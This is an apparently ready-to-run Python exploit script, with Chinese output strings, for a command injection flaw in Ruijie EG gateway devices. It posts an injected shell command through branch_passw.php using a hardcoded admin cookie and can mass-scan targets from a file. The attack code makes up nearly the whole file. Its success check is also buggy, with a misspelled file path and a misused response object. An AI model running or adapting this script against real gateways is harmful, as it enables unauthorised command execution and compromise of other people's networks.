import requests
import argparse
import urllib3
import sys

from OpenSSL.SSL import SysCallError
from urllib3.exceptions import ProxyError

urllib3.disable_warnings()


def title():
    print("""
                               锐捷_EG易网关_branch_passw_php_远程命令执行
                      use: python3  锐捷_EG易网关_branch_passw_php_远程命令执行.py
                                 Author: kento-sec
    """)


class information(object):
    def __init__(self, args):
        self.args = args
        self.url = args.url
        self.file = args.file

    def target_url(self):
        url = self.url + "/itbox_pi/branch_passw.php?a=set"
        payload = "pass%3D%7Ccat%20%2Fetc%2Fpsswd%3E..%2Ftest_test.txt="
        # files = {'file': open('test_test.txt', 'rb')}
        headers = {
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.93 Safari/537.36',
            'Content-Type': 'multipart/x-www-form-urlencoded',
            'Content-Length': '41',
            'Cookie': 'RUIJIEID=52222egp72ilkpf2de7qbrigk3;user=admin;',
            'X-Requested-With': 'XMLHttpRequest',
            'Accept-Encoding': 'gzip',
            'Connection': 'close'
        }

        try:
            requests.packages.urllib3.disable_warnings()
            response = requests.request("POST", url, headers=headers, data=payload)
            print(self.url+" 提交成功!")
            rt = requests.get(self.url + "/test_test.txt")
            print(requests.get(rt.status_code))
            if "root" in rt and response.status_code == 200:
                print("\033[32m[o]" + self.url + "存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！" + "\033[0m")
                with open("锐捷_EG易网关_branch_passw_php_远程命令执行漏洞结果.txt", mode="a") as rp:
                    rp.write(self.url + "\n")
            else:
                print(self.url+" 不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            # if requests.exceptions.SSLError:
            #     print(self.url+" 站点ssl证书连接错误！不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            #     pass
            # if requests.exceptions:
            #     print(self.url+" 站点HTTPS连接错误！不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            #     pass
            # if requests.exceptions.ConnectionError:
            #     print(self.url+" 站点连接错误！不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            #     pass
            # if requests.exceptions.ProxyError:
            #     print(self.url+" 站点代理连接错误！不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            #     pass
        except:
            print(self.url+" 不存在锐捷_EG易网关_branch_passw_php_远程命令执行漏洞！")
            pass

    def file_url(self):
        with open(self.file, "r") as urls:
            for url in urls:
                url = url.strip()  # 去除两边空格
                if url[:4] != "http":
                    url = "http://" + url
                self.url = url.strip()
                information.target_url(self)


if __name__ == "__main__":
    title()
    parser = argparse.ArgumentParser(description="锐捷_EG易网关_branch_passw_php_远程命令执行漏洞")
    parser.add_argument("-u", "--url", type=str, metavar="url", help="Target url eg:\"http://127.0.0.1\"")
    parser.add_argument("-f", "--file", metavar="file", help="Targets in file  eg:\"target.txt\"")
    args = parser.parse_args()
    if len(sys.argv) != 3:
        print(
            "[-]  参数错误！\neg1:>>>python3 锐捷_EG易网关_branch_passw_php_远程命令执行漏洞.py -u http://127.0.0.1\neg2:>>>python3 锐捷_EG易网关_branch_passw_php_远程命令执行漏洞.py -f ip.txt")
    elif args.url:
        information(args).target_url()
    elif args.file:
        information(args).file_url()
